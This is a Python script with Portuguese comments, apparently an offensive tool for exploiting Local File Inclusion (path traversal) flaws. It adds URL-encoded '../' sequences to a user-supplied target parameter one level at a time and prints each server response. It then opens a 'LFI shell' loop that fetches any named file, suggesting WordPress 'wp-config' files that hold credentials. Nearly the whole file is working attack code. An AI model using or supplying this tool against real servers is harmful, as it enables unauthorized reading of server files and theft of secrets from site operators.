# -*- coding: utf-8 -*-

import requests
from bs4 import BeautifulSoup
import sys

#realiza a conexao e retorna os dados da pagina
def realizar_conexao(link):
	headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
	requisicao = requests.get(url=link, headers=headers)
	html = requisicao.text
	soup = BeautifulSoup(html, features="lxml")
	text = soup.get_text()
	return text

print('[+]Ferramenta de auxilio para encontrar falhas de Local File Inclusion (LFI)' + '\n')


print('O link deve ser uma requisicao GET e o parametro alvo deve estar vazio')
print('exemplo:"http://127.0.0.1/download.php?arquivo=*&quantidade=1')
print('Digite o link do servidor alvo:')

url_base = raw_input()

#tratamento se o link do alvo foi inserido corretamente
if('*' in url_base):
	url_base_array = url_base.split('*')
	print(url_base_array[0] + '{injection}' + url_base_array[1]+ '\n')

else:
	print('voce esqueceu de colocar o asterisco para indicar o ponto de injecao')
	print('exemplo:"http://127.0.0.1/download.php?arquivo=*&quantidade=1')
	sys.exit(0)

#arquivo base para ser encontrado e comprovar a falha
arquivo_base = raw_input('Digite o arquivo base que voce deseja pegar do servidor (de preferencia algum arquivo comum como "index.php" ou "index.asp":' + '\n')

while True:
	url_base_array[0] = url_base_array[0] + "..%2F" # "../" == "..%2F"
	url_lfi = url_base_array[0] + arquivo_base + url_base_array[1]
	print(url_lfi + '\n')

	resultado_requisicao = realizar_conexao(url_lfi)
	print(resultado_requisicao)

	print('==================================== Deseja continuar? ====================================')
	print('[+]Se quiser descer mais um diretorio aperte ENTER, caso queira entrar nesse diretorio escreva "sim"')
	resposta_inserida = raw_input()
	#descida de diretorios ate encontrar um arquivo do servidor via LFI

	if(resposta_inserida == "sim"):
		while True:
			#signifca que o diretorio "vulneravel" foi encontrado
			print('\n' + '##############################################################################################################################################')
			print('[+]Bem-vindo a "SHELL" de LFI, voce pode acessar os dados de qualquer arquivo dessa pasta')
			arquivo_arbitrario = raw_input('Digite o nome do arquivo que queira e que provavelmente esteja nessa pasta como por exemplo "wp-config" para sites wordpress: (blind LFI)' + '\n')

			url_lfi_shell = url_lfi = url_base_array[0] + arquivo_arbitrario + url_base_array[1]
			print('\n' + 'exploit:' + url_lfi_shell + '\n')

			resultado_requisicao = realizar_conexao(url_lfi_shell)
			print(resultado_requisicao)

			